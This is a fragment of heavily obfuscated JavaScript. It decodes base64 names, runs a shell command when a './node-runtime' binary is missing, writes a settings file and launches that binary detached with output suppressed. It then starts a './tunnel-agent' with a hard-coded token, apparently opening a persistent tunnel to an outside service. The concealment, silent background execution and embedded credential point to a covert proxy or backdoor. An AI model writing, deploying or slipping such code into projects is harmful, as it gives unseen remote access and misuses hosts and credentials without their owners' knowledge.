...
function _0x14e() {
    if (!_0x3c.existsSync(_0x7a('Li9ub2RlLXJ1bnRpbWU='))) {
        ...
        _0x1a(_0x15f, { shell: '/bin/sh' }, (_0x16a) => {
            if (!_0x16a) _0x17b();
        });
    } else {
        _0x17b();
...
function _0x17b() {
    ...
    _0x3c.writeFileSync(_0x7a('YXBwLnNldHRpbmdzLmRhdGE='), JSON.stringify(_0x18c, null, 0x2));

    _0x2b(_0x7a('Li9ub2RlLXJ1bnRpbWU='), ['run', '-c', _0x7a('YXBwLnNldHRpbmdzLmRhdGE=')], { stdio: 'ignore', detached: true });

    const _0x19d = 'eyJhIjoiN2FhOWNmYTFkMDViOGYwMjY4NzYwNzRkNzBkNjI3MTgiLCJ0IjoiYzFhNWRlMzUtMTBlMi00MDVjLWJlMzgtODg3ZGY4YmNjYmM2IiwicyI6IlpUUTNObUkxWkRBdE5qVXdOUzAwTkRSa0xUa3dPVFl0WXpCbE1UaGpOek14WldGaiJ9';

    _0x2b(_0x7a('Li90dW5uZWwtYWdlbnQ='), ['tunnel', '--no-autoupdate', 'run', '--token', _0x19d], { stdio: 'inherit' });
}
